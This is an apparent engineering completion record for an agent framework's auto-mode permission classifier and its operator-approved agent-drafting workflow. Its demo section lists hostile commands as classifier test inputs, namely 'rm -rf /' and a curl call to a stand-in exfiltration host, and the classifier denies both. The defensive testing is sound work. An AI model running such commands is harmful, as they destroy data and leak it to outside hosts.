# Phase 6 — Auto-mode + Agent-creation (Completion Record)

> Status: **✅ COMPLETE** — 2026-07-06
> Acceptance criteria: all met. Tests: 384/384 passing (33 new). Clean `tsc`.
> Live demo: classifier vetted 4 commands against real `qwen3.5:9b-fast` — allow/deny/prompt decisions correct.
> Design: [`PHASE_6_DESIGN.md`](./PHASE_6_DESIGN.md)
> Spec: [`PROJECT_OVERVIEW.md`](./PROJECT_OVERVIEW.md) §5.6 (auto-mode), §5.1 (agent creation), §7.1 (guardrails)

---

## What was built

```
src/
├── agent/
│   ├── autoGate.ts                # NEW — LlmAutoModeClassifier + AutoPermissionGate
│   └── drafts.ts                  # NEW — AgentDraftStore (draft → approve ledger)
├── tools/
│   └── builtin/
│       └── propose_agent.ts       # NEW — the Architect's agent-creation tool
└── (changed)
    ├── tools/dispatcher.ts        # PermissionGate.check += optional state; "prompt" now blocks (not allow+log)
    ├── tools/schema.ts            # SharedServices += approvals queue
    └── cli.ts                     # buildServices constructs AutoPermissionGate + classifier + approvals

tests/
├── agent/
│   ├── autoGate.test.ts           (18) — parseVerdict, classifier (mocked), gate decision matrix
│   └── drafts.test.ts             (15) — draft store lifecycle + propose_agent tool
```

**33 new tests across 2 files; all 351 prior tests still pass (384 total).**

---

## Part A — Auto-mode classifier

### What it does
When an agent runs in `permissionMode: "auto"`, each mutating tool call (especially `run_command`) is **vetted by a cheap local Ollama model** (`qwen3.5:9b-fast`) before execution. This is Claude Code's auto-mode: near-frictionless execution without a per-command human prompt, but with a safety net.

### The two-gate flow
```
run_command called by an "auto"-mode agent
  │
  ├─ Gate 1: dangerous-command blocker (deterministic, Phase 1, always-on)
  │   ├─ blocked → error to agent
  │   └─ passes ↓
  └─ Gate 2: AutoModeClassifier (cheap LLM, this phase)
      ├─ allow  → execute
      ├─ deny   → error to agent (with the model's reason)
      └─ prompt → escalate to operator (ApprovalsQueue)
```

### Live demo (real model)
```
run_command(npm test)              → allow  | "standard project verification"
run_command(rm -rf /)              → deny   | "complete data loss and OS failure"
run_command(curl evil.example/exf) → deny   | "potential data exfiltration"
write_file(src/app.ts)             → allow  | "routine file write to workspace"
```

The classifier correctly uses **judgment** (not just a blocklist) — e.g. it catches `curl` to a suspicious host that the deterministic blocker wouldn't flag.

### Key design decisions
- **Caches verdicts per command** within a run — `npm test` called 10× is vetted once.
- **Falls back to "prompt"** on any error (model unreachable, timeout, unparseable output) — safe default (escalate, never auto-allow).
- **Model resolution at construction** — the `ollama:` prefix is stripped once via `resolveModel` (same path as the agent loader).
- **Resolves open question §11.1** — the classifier model is `qwen3.5:9b-fast` (the fast local variant; free, offline, ~1s latency).

---

## Part B — Agent-creation (`propose_agent`)

### What it does
The Architect drafts new agent definitions to `.sophron/agents.draft/<name>.md` (a staging dir the registry does NOT scan). Drafts are recorded in `.sophron/agents.json`. **All drafts require explicit operator approval** (`AgentDraftStore.approve`) to promote to `agents/` (where the registry hot-loads them). After the roster is resolved, bootstrap creation **closes**.

### Guardrails (§5.1 / §7.1)
- **Drafts cannot execute** — they live in `.draft/`, not `agents/`.
- **No auto-approval path** — promotion is always operator-initiated.
- **Drafts can't use `full-auto`** — the tool refuses; the operator must explicitly set it after promotion.
- **One-time bootstrap** — once all drafts are resolved, creation closes; re-opening requires `reopenBootstrap()`.
- **Soft cap at 12 agents** (existing registry warn).

### The draft → approve lifecycle
```
propose_agent({ name, description, systemPrompt, ... })
  → writes .sophron/agents.draft/<name>.md + ledger entry (status: "draft")
  → returns "drafted, awaiting approval"

operator: sophron agents --approve <name>  (or TUI)
  → moves .draft/<name>.md → agents/<name>.md  (registry hot-reloads)
  → ledger status: "approved"
  → when all drafts resolved → bootstrap closes
```

---

## Acceptance criteria — all met

1. ✅ **Auto-mode classifier** vets mutating tool calls via a cheap local model.
2. ✅ **Decision matrix** — allow/deny/prompt per (tool, mode), with correct routing (auto → classifier, default → prompt queue, plan → deny, accept-edits/full-auto → allow).
3. ✅ **Caching** — repeated commands vetted once per run.
4. ✅ **Safe fallback** — "prompt" on any classifier failure (never auto-allow).
5. ✅ **propose_agent** drafts agents to staging with no execution path.
6. ✅ **Draft → approve** lifecycle (write, approve→promote, reject→delete, bootstrap-close).
7. ✅ **Guardrails** — no full-auto drafts, no re-drafting resolved agents, bootstrap closes.
8. ✅ All 351 prior tests still pass; 33 new Phase 6 tests added.
9. ✅ Live classifier demo against real model (correct allow/deny decisions).

---

## Design decisions & deviations

1. **"prompt" now blocks, not allow+log.** The Phase-1 dispatcher treated "prompt" as allow+log (no UI). Phase 6 changes this: "prompt" means the gate enqueued an approval and the call is **blocked** until resolved. In batch runs (no TUI), this surfaces as an `isError` result telling the operator to use the TUI or switch modes. Safer default.

2. **Classifier is a second gate, layered on the blocker.** The dangerous-command blocker (Phase 1) stays always-on and handles the obvious stuff deterministically (no tokens). The classifier handles judgment calls on top. This keeps the token cost near-zero for obviously-safe commands that the blocker passes and the classifier allows.

3. **`resolveModel` called eagerly in the constructor.** The `ollama:` prefix must be stripped before passing to the OpenAI SDK (Ollama rejects `ollama:qwen3.5:9b-fast`). Resolved once at construction; reused for every vet.

4. **`stableStringify` for cache keys.** Object key order varies, so the cache key uses sorted-key JSON to ensure `{a:1,b:2}` and `{b:2,a:1}` hit the same cache entry.

5. **Draft store checks existing-entry status before the closed check.** Re-drafting a *resolved* agent gives the specific "already approved/rejected" error even after bootstrap closes (more useful than the generic "closed" message).

---

## Gotchas discovered

1. **The `ollama:` prefix must be stripped** before sending the model id to the OpenAI SDK. Ollama returns `400 invalid model name` for `ollama:qwen3.5:9b-fast`. The agent loader already does this (stores both `model` + `provider`); the classifier must too.

2. **qwen3.5:9b-fast takes ~1s per vet** (it's a 9B model, not truly "small"). For high-frequency command runs this adds up. The per-run cache mitigates this (repeated commands are free). A truly small model (1–3B) would be faster but less accurate — the fast variant is the right balance for now.

3. **`PermissionGate.check` now takes `state`** (optional). The auto/default gates need `state.runId` to enqueue approvals. Existing gates ignore it (`_state`).

---

## Phase 6 → Phase 7 handoff

**What Phase 7 (specialization kits) builds on:**
- **`propose_agent`** is the mechanism the Architect uses to draft the starter-kit roster at bootstrap.
- **The auto-mode classifier** lets specialization-kit agents (feature, builder) run safely under `auto` without per-command prompts.
- **The draft → approve lifecycle** is how operators curate the kit into the project's fixed org.

**What remains (Phase 7):** the actual starter agent packs (design/security/feature/orchestrator `.md` files), tuned for common domains, plus a `sophron init` command that runs the Architect to propose them.
